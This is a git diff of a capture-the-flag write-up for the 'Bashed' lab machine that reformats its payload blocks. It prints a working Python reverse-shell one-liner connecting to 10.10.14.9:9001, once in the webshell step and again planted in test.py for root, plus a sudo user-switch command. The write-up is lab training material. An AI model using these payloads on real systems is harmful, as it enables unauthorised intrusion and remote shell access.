@@ -20,7 +20,8 @@ We can navigate through the files and directories of the webshell, but we cannot
 We can then use netcat to get a rev shell back to our machine and then privesc from there. 
 But ncat, nc, netcat doesn't seem to work, so we tried a python shell and it worked. 
 Payload used:   
-  `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")`.  
+    
+    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash").  
   
 ## Exploitation
 Setting up a netcat listener on our machine and then catching the shell:
@@ -35,7 +36,8 @@ After using `sudo -l` to list the sudo permissions which we can perform, this is
 
 As we can see that we can run any command as the scriptmanager user. 
 Hence, we run the bash binary as the user scriptmanager to switch user to scriptmanager:  
-`sudo -u scriptmanager /bin/bash`. 
+
+    sudo -u scriptmanager /bin/bash.  
 
 And we our now the user scriptmanager!   
 
@@ -76,7 +78,9 @@ scriptmanager@bashed:/scripts$ cat test.py.
 `cat test.py
 f = open('yes.py', 'w')
 f.write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")')
-f.close`    
+f.close`  
+
+Same reverse shell payload used as above. 
 
 Now, we setup a netcat listener on our machine to catch the reverse shell:  
 ![root](/assets/shell2.png)
